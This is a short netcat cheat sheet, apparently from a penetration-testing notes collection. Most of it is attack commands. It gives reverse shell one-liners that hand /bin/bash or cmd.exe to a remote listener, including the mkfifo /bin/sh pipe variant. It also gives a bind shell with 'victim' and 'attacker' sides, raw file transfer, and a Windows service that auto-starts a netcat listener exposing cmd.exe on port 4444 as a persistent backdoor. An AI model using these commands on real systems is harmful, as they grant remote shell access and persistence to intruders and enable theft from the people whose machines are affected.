# netcat

## Shell

### reverse shell (for bind shell reverse the commands)

```
listener: nc -nvlp [local port]
client(linux): nc [remote port] -e /bin/bash
client(windows): nc [remote port] -e cmd.exe
```

### reverse shell (BSD version)

```
rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc 0.0.0.0 5555 >/tmp/f
```

### bind shell (BSD version)

```
victim side:
mkfifo foo
nc -lk 2600 0<foo | /bin/bash 1>foo

attacker side:
nc [server ip] 2600
```

## File Transfer

### push files from client to listener (and vice versa)

```
listener: nc -nvlp [local port] > [out file]
clinet: nc [ip] [remote port] < [in file]
```

### netcat HTTP server

```
nc -kl 8000 --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n'; date"
```

### serve a single webpage

```
while true; do nc -l -p 80 -q 1 < error.html; done
```

## add netcat as a service in windows

```
sc create NcService binPath= "cmd.exe /c start c:\nc.exe -nLp 4444 -e cmd.exe" start= auto error= ignore

sc start NcService

taskkill /f /im nc.exe
```

